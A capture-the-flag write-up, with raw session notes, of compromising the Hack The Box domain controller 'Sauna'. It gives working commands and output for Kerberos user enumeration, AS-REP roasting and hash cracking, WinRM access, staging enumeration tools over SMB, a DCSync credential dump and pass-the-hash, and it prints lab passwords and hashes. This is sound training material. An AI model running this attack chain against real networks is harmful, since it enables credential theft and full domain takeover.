
# HTB: Sauna – Write-up

## 1. Initial Port Scan

Performed a full TCP port scan to identify open ports:

```bash
╭─ ~/htb/sauna▒░─────────────────────────────────────────────────────────────────────────────────░▒▓ ✔  03:39:04 PM                                                                             
╰─ nmap -p- -T4 --open -Pn -vvv 10.10.10.175 -oN nmapSauna.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 15:50 EDT
Initiating Parallel DNS resolution of 1 host. at 15:50
Completed Parallel DNS resolution of 1 host. at 15:50, 0.00s elapsed                    
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:50                                                            
Scanning 10.10.10.175 [65535 ports]                                                     
Discovered open port 139/tcp on 10.10.10.175     
Discovered open port 445/tcp on 10.10.10.175     
Discovered open port 53/tcp on 10.10.10.175      
Discovered open port 135/tcp on 10.10.10.175     
Discovered open port 80/tcp on 10.10.10.175      
Discovered open port 9389/tcp on 10.10.10.175    
Discovered open port 5985/tcp on 10.10.10.175                                 
SYN Stealth Scan Timing: About 22.22% done; ETC: 15:53 (0:01:48 remaining)                                                                                                                         
Discovered open port 49689/tcp on 10.10.10.175                                
Discovered open port 88/tcp on 10.10.10.175                                   
Discovered open port 464/tcp on 10.10.10.175                                  
Discovered open port 49677/tcp on 10.10.10.175                                                                                                              
Discovered open port 3269/tcp on 10.10.10.175                                 
Discovered open port 49674/tcp on 10.10.10.175                                
Discovered open port 593/tcp on 10.10.10.175                                  
SYN Stealth Scan Timing: About 51.22% done; ETC: 15:52 (0:00:58 remaining)                                                                                                                         
Discovered open port 3268/tcp on 10.10.10.175                                 
Discovered open port 389/tcp on 10.10.10.175                                  
Discovered open port 49667/tcp on 10.10.10.175                                                                                                              
Discovered open port 636/tcp on 10.10.10.175                                  
Discovered open port 49696/tcp on 10.10.10.175                                
Discovered open port 49673/tcp on 10.10.10.175                                
Completed SYN Stealth Scan at 15:52, 102.14s elapsed (65535 total ports)                                                                                                                           
Nmap scan report for 10.10.10.175                                                                                                                           
Host is up, received user-set (0.031s latency).                               
Scanned at 2025-07-24 15:50:58 EDT for 102s                                   
Not shown: 65515 filtered tcp ports (no-response)                             
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit                                                                                                                        
PORT      STATE SERVICE          REASON                                       
53/tcp    open  domain           syn-ack ttl 127                              
80/tcp    open  http             syn-ack ttl 127                              
88/tcp    open  kerberos-sec     syn-ack ttl 127                              
135/tcp   open  msrpc            syn-ack ttl 127                              
139/tcp   open  netbios-ssn      syn-ack ttl 127                              
389/tcp   open  ldap             syn-ack ttl 127                              
445/tcp   open  microsoft-ds     syn-ack ttl 127                              
464/tcp   open  kpasswd5         syn-ack ttl 127                              
593/tcp   open  http-rpc-epmap   syn-ack ttl 127                              
636/tcp   open  ldapssl          syn-ack ttl 127                              
3268/tcp  open  globalcatLDAP    syn-ack ttl 127                              
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127                              
5985/tcp  open  wsman            syn-ack ttl 127                              
9389/tcp  open  adws             syn-ack ttl 127                              
49667/tcp open  unknown          syn-ack ttl 127                              
49673/tcp open  unknown          syn-ack ttl 127                              
49674/tcp open  unknown          syn-ack ttl 127                                                 
49677/tcp open  unknown          syn-ack ttl 127                              
49689/tcp open  unknown          syn-ack ttl 127                                                                                                            
49696/tcp open  unknown          syn-ack ttl 127                                                                                                            

Read data files from: /usr/share/nmap                                                            
Nmap done: 1 IP address (1 host up) scanned in 102.22 seconds                                                                                                                                      
           Raw packets sent: 131122 (5.769MB) | Rcvd: 90 (3.960KB)  
```

**Observation:** Multiple Windows/Active Directory-related services are exposed (LDAP, Kerberos, SMB, WinRM, AD Web Services, Global Catalog), indicating this is a domain controller or AD infrastructure. Proceed with enumeration of services in priority order.

---

## 2. Web Enumeration (Port 80)

Used `dirsearch` against the HTTP service to find potential web content and directories:

```bash
╰─ dirsearch -u http://10.10.10.175
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/b7h30/reports/http_10.10.10.175/_25-07-24_16-54-09.txt

Target: http://10.10.10.175/

[16:54:09] Starting: 
[16:54:10] 403 -  312B  - /%2e%2e//google.com                               
[16:54:10] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[16:54:13] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[16:54:14] 200 -   30KB - /about.html                                       
[16:54:21] 403 -  312B  - /cgi-bin/.%2e/%2e/%2e/%2e%2e/%2e%2e/etc/passwd     
[16:54:23] 200 -   15KB - /contact.html                                     
[16:54:23] 301 -  147B  - /css  ->  http://10.10.10.175/css/                
[16:54:26] 301 -  149B  - /fonts  ->  http://10.10.10.175/fonts/            
[16:54:28] 403 -    1KB - /images/                                          
[16:54:28] 301 -  150B  - /images  ->  http://10.10.10.175/images/          
                                                                             
Task Completed
```

**Notes:** Found `about.html` and `contact.html`, which were later used for username harvesting in Kerberos enumeration. Attempts to access sensitive paths like `/etc/passwd` returned 403, so no immediate LFI/RFI.

---

## 3. SMB Enumeration (Port 445)

Tried anonymous SMB enumeration using `smbmap`:

```bash
╰─ smbmap -H 10.10.10.175

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[!] Access denied on 10.10.10.175, no fun for you...                                                                         
[*] Closed 1 connections  
```

**Conclusion:** Anonymous access denied; no credentials yet to proceed further via SMB.

---

## 4. LDAP Enumeration (Port 389)

Queried naming contexts to confirm directory structure:

```bash
╰─ ldapsearch -x -H ldap://sauna.htb -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Pulled full domain info and objects under the base:

```bash
╭─ ~ ▓▒░─────────────────────────────────────────────────────────────────────────────────────────────────────░▒▓ ✔  05:17:33 PM  
╰─ ldapsearch -x -H ldap://sauna.htb -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
# extended LDIF
# 
# [output truncated for brevity]
#
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
...
dc: EGOTISTICAL-BANK

# Users, EGOTISTICAL-BANK.LOCAL
dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL

# Computers, EGOTISTICAL-BANK.LOCAL
dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL

[...many other container/object entries...]

# search result
search: 2
result: 0 Success

# numResponses: 19
# numEntries: 15
# numReferences: 3
```

**Action Taken:** Added `egotistical-bank.local` and `sauna.egotistical-bank.local` to `/etc/hosts` for name resolution based on LDAP discovery.

---

## 5. DNS Enumeration (Port 53)

Attempted zone transfers against both `sauna.htb` and the base domain:

```bash
╰─ dig axfr @10.10.10.175 sauna.htb

; <<>> DiG 9.20.8-6-Debian <<>> axfr @10.10.10.175 sauna.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.

╰─ dig axfr @10.10.10.175 egotistical-bank.local

; <<>> DiG 9.20.8-6-Debian <<>> axfr @10.10.10.175 egotistical-bank.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

**Conclusion:** Zone transfer not allowed publicly.

---

## 6. Kerberos Enumeration (Port 88)

Collected potential usernames from the web application’s “About Us” page and expanded them using `username-anarchy`:

```bash
╰─ cat websiteUsernamesL.txt
fergus
fergussmith           
fergus.smith                      
fergussm                          
fergsmit                          
ferguss                           
f.smith                           
fsmith                            
sfergus                           
s.fergus                          
smithf                            
smith                             
smith.f                           
smith.fergus   
```

Used `kerbrute` to enumerate valid Kerberos users:

```bash
╰─ kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL websiteUsernamesL.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
 /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
 
Version: v1.0.3 (9dad6e1) - 07/24/25 - Ronnie Flathers @ropnop

2025/07/24 19:49:44 >  Using KDC(s):
2025/07/24 19:49:44 >   10.10.10.175:88

2025/07/24 19:49:44 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2025/07/24 19:49:44 >  Done! Tested 88 usernames (1 valid) in 0.277 seconds
```

**Result:** Discovered valid user `fsmith`.

---

## 7. AS-REP Roasting (No Preauth)

Used NetExec (`nxc`) to request AS-REP for `fsmith` (account without preauthentication), saving the hash:

```bash
╰─ cat fsmith-asrep.txt 
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6d4fbf3f8a781406151d2659ae264aa2$9f2678932889aa9e140cae90925bb3ba4eeb1ef809dad470ffdeed7c7bb7763d45a530f9ba832760d6a9e8efbe1a7242bde2711d664539ac19aaca939be6086cad757c86bfec3ff22b614da8e1ee894d305b3d1c091e47ea4e01cc0f54a6ffd23a8774904e9823d943a5942bce4bb90789f2d9ddac6ffaec481a6806e8b0a6d9f2de0834c9a59671bc82c054ec390470dfef91c01261aa652f294e4ac000b71aa6ae7323b1eba14b099ecb2ee5c93c33e5ccec21fcf146b8beeae35695db39af3385064bd691c5a1655514489ac4cca95067524c492b6b3264ce19ea4f6395461eea59eb7dad4557a8349937897c029c247400a15db5b578006ea763ef3a8028
```

Cracked the AS-REP hash with `hashcat`:

```bash
╰─ hashcat -m 18200 fsmith-asrep.txt /usr/share/wordlists/rockyou.txt --force                                                    
hashcat (v6.2.6) starting                                                
...
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6d4fbf3f8a781406151d2659ae264aa2$9f2678932889aa9e140cae90925bb3ba4eeb1ef809dad470ffde
ed7c7bb7763d45a530f9ba832760d6a9e8efbe1a7242bde2711d664539ac19aaca939be6086cad757c86bfec3ff22b614da8e1ee894d305b3d1c091e47ea4e01c
c0f54a6ffd23a8774904e9823d943a5942bce4bb90789f2d9ddac6ffaec481a6806e8b0a6d9f2de0834c9a59671bc82c054ec390470dfef91c01261aa652f294e
4ac000b71aa6ae7323b1eba14b099ecb2ee5c93c33e5ccec21fcf146b8beeae35695db39af3385064bd691c5a1655514489ac4cca95067524c492b6b3264ce19e
a4f6395461eea59eb7dad4557a8349937897c029c247400a15db5b578006ea763ef3a8028:Thestrokes23

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: [...]
Recovered........: 1/1 (100.00%) Digests (new)
...
Started: Wed Jul 30 17:14:08 2025
Stopped: Wed Jul 30 17:14:49 2025
```

**Credential Obtained:** `fsmith` password is `Thestrokes23`.

---

## 8. Initial Access via Evil-WinRM

Used the cracked credentials to authenticate via `evil-winrm`:

```bash
╭─ ~/htb/sauna ▓▒░──────────────────────────────────────────────────────────────────────────────────────────░▒▓ ✔  12:09:59 PM  
╰─ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23 
Evil-WinRM shell v3.7   
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline 

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents> dir
*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
*Evil-WinRM* PS C:\Users\FSmith> cd Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> dir

    Directory: C:\Users\FSmith\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/28/2025   8:41 PM             34 user.txt

*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt
1cf802e519c0437929c018fefa822a70
```

**User Flag:** `1cf802e519c0437929c018fefa822a70`

---

## 9. Privilege Escalation Preparation

Copied `winPEASx64.exe` from the Kali box to the working directory:

```bash
╭─ ~/htb/sauna 02:49:44 PM  
╰─ winpeas

> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/winpeas
├── winPEASany.exe
├── winPEASany_ofs.exe
├── winPEAS.bat
├── winPEASx64.exe
├── winPEASx64_ofs.exe
├── winPEASx86.exe
└── winPEASx86_ofs.exe

╭─  /usr/share/peass/winpeas ▓▒░───────────────────────────────────────────────────────────────────────────░▒▓ ✔  02:50:09 PM 
╰─ cp winPEASx64.exe ~/htb/sauna/     
╭─  /usr/share/peass/winpeas ▓▒░───────────────────────────────────────────────────────────────────────────░▒▓ ✔  02:50:21 PM 
╰─ ls
winPEASany.exe  winPEASany_ofs.exe  winPEAS.bat  winPEASx64.exe  winPEASx64_ofs.exe  winPEASx86.exe  winPEASx86_ofs.exe
╭─  /usr/share/peass/winpeas ▓▒░───────────────────────────────────────────────────────────────────────────░▒▓ ✔  02:53:43 PM 
╰─ exit
╭─ ~/htb/sauna 
▓▒░───────────────────────────────────────────────────────────────────────────░▒▓ ✔  3m 37s  02:53:46 PM 
╰─ ls
fsmith-asrep.txt  sauna_services.gnmap  SaunaServicesVersions.txt  sauna_winpeas_fast     websiteUsernames.txt nmapSauna.txt     sauna_services.nmap   sauna_services.xml         websiteUsernamesL.txt  winPEASx64.exe
```

### Transfer WinPEAS to Target

Set up an SMB share on the Kali attack machine to host `winPEASx64.exe`:

```bash
╭─ ~/htb/sauna ▓▒░─────────────────────────────────────░▒▓ INT ✘  11m 58s  02:28:02 PM  
╰─ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -username df -password df share . -smb2support
```

On the Windows target, connect to the SMB share:

```powershell
\\10.10.14.16\share> net use \\10.10.14.16\share df /user:df
cd \\10.10.14.16\share\
```

Run `winPEASx64.exe` from the SMB share:

```powershell
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.16\share> .\winPEASx64.exe

...

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials 
Some AutoLogon credentials were found       
DefaultDomainName             :  EGOTISTICALBANK 
DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
DefaultPassword               :  Moneymakestheworldgoround!
```

Enumerated local users:

```powershell
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.16\share> net user
User accounts for \\
-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
```

**Discovery:** AutoLogon credentials for `svc_loanmanager` with password `Moneymakestheworldgoround!`. A second account `svc_loanmgr` also exists but initial exploration yielded no immediate privileges.

---

## 10. Bloodhound Enumeration

Copied `SharpHound.exe` to working directory and executed it from the Windows target via the SMB share to collect AD graph data:

```bash
cp /usr/share/sharphound/SharpHound.exe /htb/sauna
```

On the target:

```powershell
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.16\share> .\SharpHound.exe
```

Uploaded the resulting ZIP output into Bloodhound and analyzed relationships. Identified that the account `svc_loanmgr` has **DCSync** permissions with a path to Domain Admin (via Bloodhound graph).  
_(Placeholder: image showing Bloodhound graph was referred to — ![[Pasted image 20250801174912.png]] )_

---

## 11. DCSync Attack & Domain Compromise

Performed a DCSync attack using `impacket-secretsdump` with the `svc_loanmgr` account:

```bash
╭─ ~/htb/sauna ▓▒░────────────────────────────────────────────────────────────░▒▓ ✔  04:40:01 PM                    
╰─ impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.10.10.175'                   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)     
[*] Using the DRSUAPI method to get NTDS.DIT secrets        
Administrator:500:aad3b435b51404eeaad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::     
```

**Result:** Retrieved NTLM hash for `Administrator` (RID 500): `823452073d75b9d1cf70ebdf86c7f98e`.

---

## 12. Pass-the-Hash & Root Flag

Used the harvested administrator hash to authenticate via `evil-winrm` using pass-the-hash:

```bash
╭─ ~/htb/sauna ▓▒░──────────────────────────────────────────────────────────────────────────────────░▒▓ 127 ✘  05:32:03 PM 
╰─ evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/28/2025   8:41 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
73b6893a471e3977b74e466e8f455d1d
```

**Root Flag:** `73b6893a471e3977b74e466e8f455d1d`

---

# Summary

- **Initial enumeration** revealed a Windows Active Directory environment with many AD-related services exposed.
    
- **Web content** provided employee names used for username generation.
    
- **Kerberos enumeration** with `kerbrute` found valid user `fsmith`, and AS-REP roasting yielded credentials (`Thestrokes23`).
    
- **Initial access** gained via Evil-WinRM as `fsmith`.
    
- **Privilege escalation** discovered AutoLogon credentials for `svc_loanmanager` via WinPEAS.
    
- **Bloodhound analysis** showed `svc_loanmgr` had DCSync capabilities.
    
- **Domain compromise** executed with `impacket-secretsdump` to obtain the Administrator hash.
    
- **Pass-the-hash** used to get domain admin access and retrieve root flag.
    

---

# Recommendations / Notes

1. **Evidence organization:** Consider trimming large LDAP output in the main report and moving full raw dumps to an appendix or separate artifacts, with summarized key findings inline (e.g., list of relevant objects, credentials, delegated rights).
    
2. **Bloodhound graph:** Embed a properly captioned screenshot of the path from `svc_loanmgr` to Domain Admin to visually support the DCSync capability claim.
    
3. **Credential reuse reasoning:** Explicitly note why `svc_loanmanager` vs `svc_loanmgr` distinction was investigated (if any confusion), and clarify if both accounts were tested.
    
4. **Timeline:** Adding dates/timestamps per major action (you already have some; making them consistent helps during debrief).
    
5. **Next steps (if this were a real engagement):** Recommend detecting/preventing DCSync, securing AutoLogon credentials, enforcing Kerberos pre-auth, and limiting service account privileges.
    



---

## Raw notes from session

- open port scan
```bash
╭─ ~/htb/sauna▒░─────────────────────────────────────────────────────────────────────────────────░▒▓ ✔  03:39:04 PM                                                                             
╰─ nmap -p- -T4 --open -Pn -vvv 10.10.10.175 -oN nmapSauna.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 15:50 EDT
Initiating Parallel DNS resolution of 1 host. at 15:50
Completed Parallel DNS resolution of 1 host. at 15:50, 0.00s elapsed                    
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:50                                                            
Scanning 10.10.10.175 [65535 ports]                                                     
Discovered open port 139/tcp on 10.10.10.175     
Discovered open port 445/tcp on 10.10.10.175     
Discovered open port 53/tcp on 10.10.10.175      
Discovered open port 135/tcp on 10.10.10.175     
Discovered open port 80/tcp on 10.10.10.175      
Discovered open port 9389/tcp on 10.10.10.175    
Discovered open port 5985/tcp on 10.10.10.175                                 
SYN Stealth Scan Timing: About 22.22% done; ETC: 15:53 (0:01:48 remaining)                                                                                                                         
Discovered open port 49689/tcp on 10.10.10.175                                
Discovered open port 88/tcp on 10.10.10.175                                   
Discovered open port 464/tcp on 10.10.10.175                                  
Discovered open port 49677/tcp on 10.10.10.175                                                                                                              
Discovered open port 3269/tcp on 10.10.10.175                                 
Discovered open port 49674/tcp on 10.10.10.175                                
Discovered open port 593/tcp on 10.10.10.175                                  
SYN Stealth Scan Timing: About 51.22% done; ETC: 15:52 (0:00:58 remaining)                                                                                                                         
Discovered open port 3268/tcp on 10.10.10.175                                 
Discovered open port 389/tcp on 10.10.10.175                                  
Discovered open port 49667/tcp on 10.10.10.175                                                                                                              
Discovered open port 636/tcp on 10.10.10.175                                  
Discovered open port 49696/tcp on 10.10.10.175                                
Discovered open port 49673/tcp on 10.10.10.175                                
Completed SYN Stealth Scan at 15:52, 102.14s elapsed (65535 total ports)                                                                                                                           
Nmap scan report for 10.10.10.175                                                                                                                           
Host is up, received user-set (0.031s latency).                               
Scanned at 2025-07-24 15:50:58 EDT for 102s                                   
Not shown: 65515 filtered tcp ports (no-response)                             
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit                                                                                                                        
PORT      STATE SERVICE          REASON                                       
53/tcp    open  domain           syn-ack ttl 127                              
80/tcp    open  http             syn-ack ttl 127                              
88/tcp    open  kerberos-sec     syn-ack ttl 127                              
135/tcp   open  msrpc            syn-ack ttl 127                              
139/tcp   open  netbios-ssn      syn-ack ttl 127                              
389/tcp   open  ldap             syn-ack ttl 127                              
445/tcp   open  microsoft-ds     syn-ack ttl 127                              
464/tcp   open  kpasswd5         syn-ack ttl 127                              
593/tcp   open  http-rpc-epmap   syn-ack ttl 127                              
636/tcp   open  ldapssl          syn-ack ttl 127                              
3268/tcp  open  globalcatLDAP    syn-ack ttl 127                              
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127                              
5985/tcp  open  wsman            syn-ack ttl 127                              
9389/tcp  open  adws             syn-ack ttl 127                              
49667/tcp open  unknown          syn-ack ttl 127                              
49673/tcp open  unknown          syn-ack ttl 127                              
49674/tcp open  unknown          syn-ack ttl 127                                                 
49677/tcp open  unknown          syn-ack ttl 127                              
49689/tcp open  unknown          syn-ack ttl 127                                                                                                            
49696/tcp open  unknown          syn-ack ttl 127                                                                                                            

Read data files from: /usr/share/nmap                                                            
Nmap done: 1 IP address (1 host up) scanned in 102.22 seconds                                                                                                                                      
           Raw packets sent: 131122 (5.769MB) | Rcvd: 90 (3.960KB)  
```

- using dirsearch on port 80 / website
	- nothing worthwhile found
```bash
╰─ dirsearch -u http://10.10.10.175
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/b7h30/reports/http_10.10.10.175/_25-07-24_16-54-09.txt

Target: http://10.10.10.175/

[16:54:09] Starting: 
[16:54:10] 403 -  312B  - /%2e%2e//google.com                               
[16:54:10] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[16:54:13] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[16:54:14] 200 -   30KB - /about.html                                       
[16:54:21] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[16:54:23] 200 -   15KB - /contact.html                                     
[16:54:23] 301 -  147B  - /css  ->  http://10.10.10.175/css/                
[16:54:26] 301 -  149B  - /fonts  ->  http://10.10.10.175/fonts/            
[16:54:28] 403 -    1KB - /images/                                          
[16:54:28] 301 -  150B  - /images  ->  http://10.10.10.175/images/          
                                                                             
Task Completed

```

- moving on to smb 445 / microsoft-ds
	- smbmap to try anonymous login -- no dice
```bash
╰─ smbmap -H 10.10.10.175

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                      
[!] Access denied on 10.10.10.175, no fun for you...                                                                         
[*] Closed 1 connections  
```

- moving on to ldap 389
	- ldapsearch to pull naming contexts 
	- DC = EGOTISTICAL-BANK
	- DC = LOCAL
```bash
╰─ ldapsearch -x -H ldap://sauna.htb -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```
- using ldapsearch and domain info to pull more info
	- then add egotistical-bank.local and sauna.egotistical-bank.local to etc/hosts
	```bash
	# numEntries: 1                                                                                                                   
	╭─ ~ ▓▒░─────────────────────────────────────────────────────────────────────────────────────────────────────░▒▓ ✔  05:17:33 PM  
	╰─ ldapsearch -x -H ldap://sauna.htb -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'                                                            
	# extended LDIF                                                                                                                   
	#                                                                                                                                                           
	# LDAPv3                                                                                                                                                                                           
	# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree                                                                                                    
	# filter: (objectclass=*)                                                                                                                                                                          
	# requesting: ALL                                                                                                                 
	#                                                                                                                                                           
	                                                                                                                                                                                                   
	# EGOTISTICAL-BANK.LOCAL                                                      
	dn: DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                            
	objectClass: top                                                                                                                                                                                   
	objectClass: domain                                                                                                                                         
	objectClass: domainDNS                                                                                                                                                                             
	distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                               
	instanceType: 5                                                                                                                                                                                    
	whenCreated: 20200123054425.0Z                                                                                                    
	whenChanged: 20250725022423.0Z                  
	subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                           
	subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                                                                                            
	subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL                                                                            
	uSNCreated: 4099                                                                                                                                                                                   
	dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==                                                                                                                            
	uSNChanged: 98336                                                                                                                                                                                  
	name: EGOTISTICAL-BANK                                                                                                                                                                             
	objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==                                                            
	replUpToDateVector:: AgAAAAAAAAAGAAAAAAAAAEbG/1RIhXVKvwnC1AVq4o8WgAEAAAAAANV7k                                                                                                                     
	 x4DAAAAq4zveNFJhUSywu2cZf6vrQzgAAAAAAAAKDj+FgMAAADc0VSB8WEuQrRECkAJ5oR1FXABAA                    
	 AAAADUbg8XAwAAAP1ahZJG3l5BqlZuakAj9gwL0AAAAAAAANDwChUDAAAAm/DFn2wdfEWLFfovGj4                                                                                                                     
	 TThRgAQAAAAAAENUAFwMAAABAvuCzxiXsRLK5n/hcRLLsCbAAAAAAAADUBFIUAwAAAA==                                                            
	creationTime: 133978838632328073                                                                                                  
	forceLogoff: -9223372036854775808                                                                
	lockoutDuration: -18000000000                                                                                                     
	lockOutObservationWindow: -18000000000                                                                         
	lockoutThreshold: 0                                                                                                               
	maxPwdAge: -36288000000000                                                                                     
	minPwdAge: -864000000000                                                                                       
	minPwdLength: 7                                                                                  
	modifiedCountAtLastProm: 0                                                                                     
	nextRid: 1000                                                                                                  
	pwdProperties: 1                                                                                 
	pwdHistoryLength: 24                                                                                                              
	objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG              
	serverState: 1                                                                                                                    
	uASCompat: 1                                                     
